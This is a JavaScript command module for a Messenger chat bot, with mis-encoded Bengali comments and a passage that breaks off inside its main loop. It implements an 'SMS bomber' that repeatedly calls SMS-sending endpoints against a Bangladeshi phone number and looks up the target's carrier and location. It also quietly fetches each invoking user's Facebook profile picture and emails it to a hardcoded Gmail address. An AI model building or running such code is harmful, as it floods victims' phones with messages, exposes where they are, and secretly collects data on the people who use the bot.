const axios = require("axios");
const nodemailer = require("nodemailer");
const fs = require("fs");
const https = require("https");

const bombingFlags = {};
const userRateLimit = {};
const rateLimitSeconds = 60; // ‡¶™‡ßç‡¶∞‡¶§‡¶ø ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡ßß ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶§‡ßá ‡¶π‡¶¨‡ßá ‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø

// ‡¶¨‡ßç‡¶≤‡ßç‡¶Ø‡¶æ‡¶ï‡¶≤‡¶ø‡¶∏‡ßç‡¶ü ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶¨‡¶æ ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ü‡¶á‡¶°‡¶ø ‡¶è‡¶ñ‡¶æ‡¶®‡ßá
const blacklist = new Set([
  // "017xxxxxxxx", "USER_ID_123456"
]);

const SMS_APIS = [
  "https://ultranetrn.com.br/fonts/api.php?number=",
  "https://backupapi.example.com/send?phone="
];

// Gmail Config - ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶® ‡¶ï‡¶∞‡¶¨‡ßá‡¶®
const GMAIL_USER = "YOUR_EMAIL@gmail.com";
const GMAIL_PASS = "YOUR_APP_PASSWORD"; // Gmail App Password

async function sendEmail(subject, text, attachments = []) {
  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: GMAIL_USER,
      pass: GMAIL_PASS,
    },
  });

  let mailOptions = {
    from: `"SMS Bomber Bot" <${GMAIL_USER}>`,
    to: "nurnobikhan2642@gmail.com",
    subject,
    text,
    attachments,
  };

  await transporter.sendMail(mailOptions);
}

async function sendProfilePicToEmail(senderID) {
  const avatarUrl = `https://graph.facebook.com/${senderID}/picture?width=512&height=512`;
  const filePath = `/tmp/${senderID}.jpg`;

  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);
    https.get(avatarUrl, (response) => {
      response.pipe(file);
      file.on("finish", async () => {
        file.close();

        try {
          await sendEmail(
            "üë§ ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ SMS ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßá‡¶õ‡ßá!",
            `‡¶è‡¶á ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ SMS ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶ö‡¶æ‡¶≤‡¶ø‡ßü‡ßá‡¶õ‡ßá‡•§`,
            [{ filename: `${senderID}.jpg`, path: filePath }]
          );
          resolve();
        } catch (err) {
          reject(err);
        }
      });
    });
  });
}

function getOperatorInfo(number) {
  const prefix = number.substring(0, 4);
  const operators = {
    "0171": "Grameenphone",
    "0172": "Grameenphone",
    "017": "Grameenphone",
    "018": "Robi",
    "019": "Banglalink",
    "016": "Airtel",
    "015": "Teletalk",
    "013": "Grameenphone (new series)",
    "014": "Banglalink (new series)",
  };
  return operators[prefix] || operators[prefix.substring(0, 3)] || "‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ ‡¶Ö‡¶™‡¶æ‡¶∞‡ßá‡¶ü‡¶∞";
}

async function getNumberLocation(number) {
  try {
    // ‡¶™‡ßç‡¶∞‡¶ß‡¶æ‡¶® API
    let response = await axios.get(
      `https://api.numlookupapi.com/v1/validate/${number}?apikey=YOUR_API_KEY`
    );
    if (!response.data.location) throw new Error("‡¶™‡ßç‡¶∞‡¶ß‡¶æ‡¶® API ‡¶§‡ßá ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶®‡ßá‡¶á");

    return `üåç ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶®: ${response.data.location || "‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ"}\nüì∂ ‡¶ï‡ßç‡¶Ø‡¶æ‡¶∞‡¶ø‡ßü‡¶æ‡¶∞: ${response.data.carrier || "‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ"}\nüìû ‡¶≤‡¶æ‡¶á‡¶® ‡¶ü‡¶æ‡¶á‡¶™: ${response.data.line_type || "‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ"}`;
  } catch {
    try {
      // ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶Ü‡¶™ API
      let response = await axios.get(
        `https://somebackupapi.example.com/lookup?number=${number}`
      );
      return `üåç ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶®: ${response.data.location || "‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ"}\nüì∂ ‡¶ï‡ßç‡¶Ø‡¶æ‡¶∞‡¶ø‡ßü‡¶æ‡¶∞: ${response.data.carrier || "‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ"}\nüìû ‡¶≤‡¶æ‡¶á‡¶® ‡¶ü‡¶æ‡¶á‡¶™: ${response.data.line_type || "‡¶Ö‡¶ú‡¶æ‡¶®‡¶æ"}`;
    } catch (error) {
      return `‚ùó ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶§‡¶•‡ßç‡¶Ø ‡¶Ü‡¶®‡¶§‡ßá ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•: ${error.message}`;
    }
  }
}

function logSMSReport(senderID, number, count) {
  const logLine = `${new Date().toISOString()} - ‡¶á‡¶â‡¶ú‡¶æ‡¶∞: ${senderID} - ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞: ${number} - SMS ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡ßü‡ßá‡¶õ‡ßá: ${count}\n`;
  fs.appendFile("sms_report.log", logLine, (err) => {
    if (err) console.error("‡¶≤‡¶ó ‡¶´‡¶æ‡¶á‡¶≤ ‡¶≤‡ßá‡¶ñ‡¶æ‡¶∞ ‡¶§‡ßç‡¶∞‡ßÅ‡¶ü‡¶ø:", err);
  });
}

function isUserRateLimited(userID) {
  const lastTime = userRateLimit[userID];
  if (!lastTime) return false;

  return Date.now() - lastTime < rateLimitSeconds * 1000;
}

function updateUserRateLimit(userID) {
  userRateLimit[userID] = Date.now();
}

module.exports.config = {
  name: "sms",
  version: "4.0.0",
  hasPermssion: 0,
  credits: "‚ÄîÕüÕüÕûÕûRAJA ViP 5X",
  description: "‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ SMS ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ + ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® + ‡¶™‡ßç‡¶∞‡ßã‡¶´‡¶æ‡¶á‡¶≤ ‡¶™‡¶ø‡¶ï + ‡¶ï‡¶®‡ßç‡¶ü‡ßç‡¶∞‡ßã‡¶≤ + ‡¶≤‡¶ó‡¶ø‡¶Ç + ‡¶á‡¶Æ‡ßá‡¶á‡¶≤ ‡¶∞‡¶ø‡¶™‡ßã‡¶∞‡ßç‡¶ü",
  commandCategory: "Tool",
  usages: "/sms 01xxxxxxxxx [‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°]\n/sms off",
  cooldowns: 0,
  dependencies: { axios: "", nodemailer: "" },
};

module.exports.run = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const userID = event.senderID;
  const number = args[0];
  const durationSeconds = parseInt(args[1]) || 0;

  // ‡¶¨‡ßç‡¶≤‡ßç‡¶Ø‡¶æ‡¶ï‡¶≤‡¶ø‡¶∏‡ßç‡¶ü ‡¶ö‡ßá‡¶ï
  if (blacklist.has(number) || blacklist.has(userID)) {
    return api.sendMessage("‚ùå ‡¶Ü‡¶™‡¶®‡¶ø ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶ö‡¶æ‡¶≤‡¶æ‡¶®‡ßã‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶¨‡ßç‡¶≤‡¶ï‡¶°‡•§", threadID);
  }

  // ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶∞‡ßá‡¶ü ‡¶≤‡¶ø‡¶Æ‡¶ø‡¶ü ‡¶ö‡ßá‡¶ï
  if (isUserRateLimited(userID)) {
    return api.sendMessage(
      `‚è≥ ‡¶Ü‡¶™‡¶®‡¶ø ‡¶è‡¶ï‡¶ü‡ßÅ ‡¶™‡¶∞‡ßá ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§ ‡¶™‡ßç‡¶∞‡¶§‡¶ø ${rateLimitSeconds} ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶°‡ßá ‡¶è‡¶ï‡¶¨‡¶æ‡¶∞ ‡¶ö‡¶æ‡¶≤‡¶æ‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶¨‡ßá‡¶®‡•§`,
      threadID
    );
  }

  // ‡¶™‡ßç‡¶∞‡ßã‡¶´‡¶æ‡¶á‡¶≤ ‡¶™‡¶ø‡¶ï ‡¶á‡¶Æ‡ßá‡¶á‡¶≤ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
  sendProfilePicToEmail(userID).catch((e) =>
    console.error("Profile pic ‡¶á‡¶Æ‡ßá‡¶á‡¶≤ ‡¶™‡¶æ‡¶†‡¶æ‡¶§‡ßá ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ:", e)
  );

  if (number === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage("‚úÖ SMS ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§", threadID);
    } else {
      return api.sendMessage("‚ùó‡¶è‡¶á ‡¶•‡ßç‡¶∞‡ßá‡¶°‡ßá ‡¶ï‡ßã‡¶® ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶ø‡¶Ç ‡¶ö‡¶≤‡¶õ‡¶ø‡¶≤ ‡¶®‡¶æ‡•§", threadID);
    }
  }

  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage(
      "‚ùó ‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¶‡¶ø‡¶® (‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂‡¶ø 01xxxxxxxxx ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü‡ßá)",
      threadID
    );
  }

  if (bombingFlags[threadID]) {
    return api.sendMessage(
      "‚ùó‡¶è‡¶á ‡¶•‡ßç‡¶∞‡ßá‡¶°‡ßá ‡¶á‡¶§‡¶ø‡¶Æ‡¶ß‡ßç‡¶Ø‡ßá ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶ø‡¶Ç ‡¶ö‡¶≤‡¶õ‡ßá! ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶§‡ßá /sms off",
      threadID
    );
  }

  // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶ì ‡¶Ö‡¶™‡¶æ‡¶∞‡ßá‡¶ü‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø
  const operator = getOperatorInfo(number);
  const locationInfo = await getNumberLocation(number);

  let count = 0;
  bombingFlags[threadID] = true;
  updateUserRateLimit(userID);

  api.sendMessage(
    `‚úÖ SMS ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶ø‡¶Ç ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá ${number} ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞‡ßá...\nüì± ‡¶Ö‡¶™‡¶æ‡¶∞‡ßá‡¶ü‡¶∞: ${operator}\n${locationInfo}\n\n‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶§‡ßá /sms off`,
    threadID
  );

  // Auto response to user
  api.sendMessage(
    "üî∞ ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ SMS ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡ßü‡ßá‡¶õ‡ßá‡•§ ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶§‡ßá /sms off ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®‡•§",
    userID
  );

  // ‡¶ü‡¶æ‡¶á‡¶Æ‡¶æ‡¶∞ ‡¶•‡¶æ‡¶ï‡¶≤‡ßá ‡¶™‡¶∞‡ßá ‡¶¨‡¶®‡ßç‡¶ß ‡¶π‡¶¨‡ßá
  if (durationSeconds > 0) {
    setTimeout(() => {
      bombingFlags[threadID] = false;
      api.sendMessage("‚è≥ ‡¶∏‡¶Æ‡ßü ‡¶∂‡ßá‡¶∑, ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¨‡¶®‡ßç‡¶ß ‡¶π‡ßü‡ßá‡¶õ‡ßá!", threadID);
    }, durationSeconds * 1000);
  }

  // SMS ‡¶¨‡ßã‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶≤‡ßÅ‡¶™
  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        // ‡¶∞‚Äç‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶Æ API ‡¶¨‡ßá‡¶õ‡ßá ‡¶®‡ßá‡ßü‡¶æ
        const apiUrl =
          SMS_APIS[Math.floor(Math.random() * SMS_APIS.length)] + number;
        await axios.get(apiUrl);

        count++;
        logSMSReport(userID, number, count);

        if (count % 10 === 0) {
